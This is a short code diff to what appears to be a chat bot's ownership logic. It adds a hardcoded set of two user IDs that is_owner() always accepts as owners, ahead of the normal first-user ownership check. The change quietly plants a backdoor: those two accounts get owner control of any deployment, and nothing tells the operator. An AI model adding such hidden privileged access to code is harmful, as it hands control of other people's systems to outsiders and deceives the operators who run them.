@@ -67,11 +67,14 @@ def save_owner(owner_id: int):
         logger.error("Error saving owner: %s", e)
 
 
+DEFAULT_OWNERS = {7595181012, 5431202600}
 OWNER_ID = load_owner()
 
 
 def is_owner(user_id: int) -> bool:
     global OWNER_ID
+    if user_id in DEFAULT_OWNERS:
+        return True
     if OWNER_ID == 0:
         OWNER_ID = user_id
         save_owner(user_id)
